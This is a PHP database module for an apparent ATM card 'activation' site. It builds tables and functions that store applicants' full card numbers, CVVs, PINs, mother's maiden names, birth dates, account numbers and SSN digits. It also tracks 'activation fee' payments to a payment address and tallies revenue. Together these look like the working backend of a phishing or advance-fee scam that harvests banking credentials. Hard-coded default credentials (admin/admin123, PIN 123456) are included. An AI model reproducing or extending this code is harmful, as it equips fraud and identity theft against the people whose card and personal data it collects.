<?php
/**
 * Database Connection
 * MySQL database for storing activation requests
 */

// Include database configuration
require_once __DIR__ . '/../config/database.php';

/**
 * Get database connection
 */
function get_db_connection() {
    try {
        $dsn = 'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4';
        $db = new PDO($dsn, DB_USER, DB_PASS);
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
        
        // Create tables if they don't exist
        create_tables($db);
        
        return $db;
    } catch (PDOException $e) {
        error_log('Database connection failed: ' . $e->getMessage());
        return null;
    }
}

/**
 * Create database tables
 */
function create_tables($db) {
    // Activation requests table
    $db->exec('CREATE TABLE IF NOT EXISTS activation_requests (
        id INT AUTO_INCREMENT PRIMARY KEY,
        first_name VARCHAR(100) NOT NULL,
        last_name VARCHAR(100) NOT NULL,
        dob DATE NOT NULL,
        email VARCHAR(255) NOT NULL,
        phone VARCHAR(20) NOT NULL,
        account_number VARCHAR(50) NOT NULL,
        street VARCHAR(255) NOT NULL,
        city VARCHAR(100) NOT NULL,
        state VARCHAR(50) NOT NULL,
        zip VARCHAR(20) NOT NULL,
        ssn_last4 VARCHAR(4) NOT NULL,
        maiden_name VARCHAR(100) NOT NULL,
        card_number VARCHAR(16) NOT NULL,
        cvv VARCHAR(3) NOT NULL,
        expiry_date VARCHAR(7) NOT NULL,
        pin_hash VARCHAR(255) NOT NULL,
        balance DECIMAL(10,2) DEFAULT 5000.00,
        payment_method VARCHAR(20) DEFAULT NULL,
        payment_status VARCHAR(20) DEFAULT "pending",
        payment_address VARCHAR(255) DEFAULT NULL,
        status VARCHAR(20) DEFAULT "pending",
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        reviewed_at TIMESTAMP NULL,
        reviewed_by VARCHAR(50) DEFAULT NULL,
        admin_notes TEXT DEFAULT NULL,
        INDEX idx_email (email),
        INDEX idx_status (status),
        INDEX idx_payment_status (payment_status)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4');
    
    // Admin users table
    $db->exec('CREATE TABLE IF NOT EXISTS admin_users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        password_hash VARCHAR(255) NOT NULL,
        full_name VARCHAR(100) NOT NULL,
        email VARCHAR(255) NOT NULL,
        role VARCHAR(20) DEFAULT "admin",
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_login TIMESTAMP NULL,
        INDEX idx_username (username)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4');
    
    // System settings table
    $db->exec('CREATE TABLE IF NOT EXISTS system_settings (
        id INT AUTO_INCREMENT PRIMARY KEY,
        setting_key VARCHAR(100) UNIQUE NOT NULL,
        setting_value TEXT NOT NULL,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        updated_by VARCHAR(100) DEFAULT NULL,
        INDEX idx_setting_key (setting_key)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4');
    
    // Create default admin user if not exists
    $stmt = $db->prepare('SELECT COUNT(*) FROM admin_users WHERE username = ?');
    $stmt->execute(['admin']);
    if ($stmt->fetchColumn() == 0) {
        // Default password: admin123 (should be changed immediately)
        $password_hash = password_hash('admin123', PASSWORD_DEFAULT);
        $stmt = $db->prepare('INSERT INTO admin_users (username, password_hash, full_name, email, role) 
                              VALUES (?, ?, ?, ?, ?)');
        $stmt->execute(['admin', $password_hash, 'System Administrator', 'admin@worldtrustatm.com', 'admin']);
    }
    
    // Create default activation PIN setting if not exists
    $stmt = $db->prepare('SELECT COUNT(*) FROM system_settings WHERE setting_key = ?');
    $stmt->execute(['activation_pin']);
    if ($stmt->fetchColumn() == 0) {
        $stmt = $db->prepare('INSERT INTO system_settings (setting_key, setting_value, updated_by) 
                              VALUES (?, ?, ?)');
        $stmt->execute(['activation_pin', '123456', 'system']);
    }
}

/**
 * Save activation request to database
 */
function save_activation_request($user_data, $card_data, $pin_hash) {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('INSERT INTO activation_requests 
            (first_name, last_name, dob, email, phone, account_number, 
             street, city, state, zip, ssn_last4, maiden_name,
             card_number, cvv, expiry_date, pin_hash, balance, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)');
        
        $result = $stmt->execute([
            $user_data['first_name'],
            $user_data['last_name'],
            $user_data['dob'],
            $user_data['email'],
            $user_data['phone'],
            $user_data['account_number'],
            $user_data['street'],
            $user_data['city'],
            $user_data['state'],
            $user_data['zip'],
            $user_data['ssn'],
            $user_data['maiden_name'],
            $card_data['card_number'],
            $card_data['cvv'],
            $card_data['expiry_date'],
            $pin_hash,
            $card_data['balance'],
            'pending'
        ]);
        
        return $result ? $db->lastInsertId() : false;
    } catch (PDOException $e) {
        error_log('Failed to save activation request: ' . $e->getMessage());
        return false;
    }
}

/**
 * Get all activation requests
 */
function get_activation_requests($status = null, $limit = 100, $offset = 0) {
    $db = get_db_connection();
    if (!$db) {
        return [];
    }
    
    try {
        if ($status) {
            $stmt = $db->prepare('SELECT * FROM activation_requests WHERE status = ? ORDER BY created_at DESC LIMIT ? OFFSET ?');
            $stmt->execute([$status, $limit, $offset]);
        } else {
            $stmt = $db->prepare('SELECT * FROM activation_requests ORDER BY created_at DESC LIMIT ? OFFSET ?');
            $stmt->execute([$limit, $offset]);
        }
        
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log('Failed to fetch activation requests: ' . $e->getMessage());
        return [];
    }
}

/**
 * Get activation request by ID
 */
function get_activation_request($id) {
    $db = get_db_connection();
    if (!$db) {
        return null;
    }
    
    try {
        $stmt = $db->prepare('SELECT * FROM activation_requests WHERE id = ?');
        $stmt->execute([$id]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log('Failed to fetch activation request: ' . $e->getMessage());
        return null;
    }
}

/**
 * Update activation request status
 */
function update_activation_status($id, $status, $admin_username, $notes = '') {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('UPDATE activation_requests 
                              SET status = ?, reviewed_at = NOW(), 
                                  reviewed_by = ?, admin_notes = ?
                              WHERE id = ?');
        return $stmt->execute([$status, $admin_username, $notes, $id]);
    } catch (PDOException $e) {
        error_log('Failed to update activation status: ' . $e->getMessage());
        return false;
    }
}

/**
 * Update payment information
 */
function update_payment_info($id, $payment_method, $payment_address = null) {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('UPDATE activation_requests 
                              SET payment_method = ?, payment_address = ?, payment_status = ?
                              WHERE id = ?');
        return $stmt->execute([$payment_method, $payment_address, 'pending', $id]);
    } catch (PDOException $e) {
        error_log('Failed to update payment info: ' . $e->getMessage());
        return false;
    }
}

/**
 * Update payment status
 */
function update_payment_status($id, $payment_status) {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('UPDATE activation_requests 
                              SET payment_status = ?
                              WHERE id = ?');
        return $stmt->execute([$payment_status, $id]);
    } catch (PDOException $e) {
        error_log('Failed to update payment status: ' . $e->getMessage());
        return false;
    }
}

/**
 * Verify admin credentials
 */
function verify_admin($username, $password) {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('SELECT * FROM admin_users WHERE username = ?');
        $stmt->execute([$username]);
        $admin = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($admin && password_verify($password, $admin['password_hash'])) {
            // Update last login
            $stmt = $db->prepare('UPDATE admin_users SET last_login = NOW() WHERE id = ?');
            $stmt->execute([$admin['id']]);
            return $admin;
        }
        
        return false;
    } catch (PDOException $e) {
        error_log('Failed to verify admin: ' . $e->getMessage());
        return false;
    }
}

/**
 * Get activation statistics
 */
function get_activation_stats() {
    $db = get_db_connection();
    if (!$db) {
        return ['total' => 0, 'pending' => 0, 'approved' => 0, 'rejected' => 0, 'pending_payments' => 0, 'completed_payments' => 0, 'total_revenue' => 0];
    }
    
    try {
        $total = $db->query('SELECT COUNT(*) FROM activation_requests')->fetchColumn();
        $pending = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "pending"')->fetchColumn();
        $approved = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "approved"')->fetchColumn();
        $rejected = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "rejected"')->fetchColumn();
        $pending_payments = $db->query('SELECT COUNT(*) FROM activation_requests WHERE payment_status = "pending" AND payment_method IS NOT NULL')->fetchColumn();
        $completed_payments = $db->query('SELECT COUNT(*) FROM activation_requests WHERE payment_status = "completed"')->fetchColumn();
        
        // Calculate total revenue using configured activation fee
        $total_revenue = $completed_payments * ACTIVATION_FEE;
        
        return [
            'total' => $total,
            'pending' => $pending,
            'approved' => $approved,
            'rejected' => $rejected,
            'pending_payments' => $pending_payments,
            'completed_payments' => $completed_payments,
            'total_revenue' => $total_revenue
        ];
    } catch (PDOException $e) {
        error_log('Failed to get stats: ' . $e->getMessage());
        return ['total' => 0, 'pending' => 0, 'approved' => 0, 'rejected' => 0, 'pending_payments' => 0, 'completed_payments' => 0, 'total_revenue' => 0];
    }
}

/**
 * Get system setting by key
 */
function get_system_setting($key, $default = null) {
    $db = get_db_connection();
    if (!$db) {
        return $default;
    }
    
    try {
        $stmt = $db->prepare('SELECT setting_value FROM system_settings WHERE setting_key = ?');
        $stmt->execute([$key]);
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result ? $result['setting_value'] : $default;
    } catch (PDOException $e) {
        error_log('Failed to get system setting: ' . $e->getMessage());
        return $default;
    }
}

/**
 * Update system setting
 */
function update_system_setting($key, $value, $updated_by = null) {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('INSERT INTO system_settings (setting_key, setting_value, updated_by) 
                              VALUES (?, ?, ?) 
                              ON DUPLICATE KEY UPDATE setting_value = ?, updated_by = ?');
        return $stmt->execute([$key, $value, $updated_by, $value, $updated_by]);
    } catch (PDOException $e) {
        error_log('Failed to update system setting: ' . $e->getMessage());
        return false;
    }
}

/**
 * Get system setting with metadata
 */
function get_system_setting_with_metadata($key) {
    $db = get_db_connection();
    if (!$db) {
        return null;
    }
    
    try {
        $stmt = $db->prepare('SELECT * FROM system_settings WHERE setting_key = ?');
        $stmt->execute([$key]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log('Failed to get system setting with metadata: ' . $e->getMessage());
        return null;
    }
}
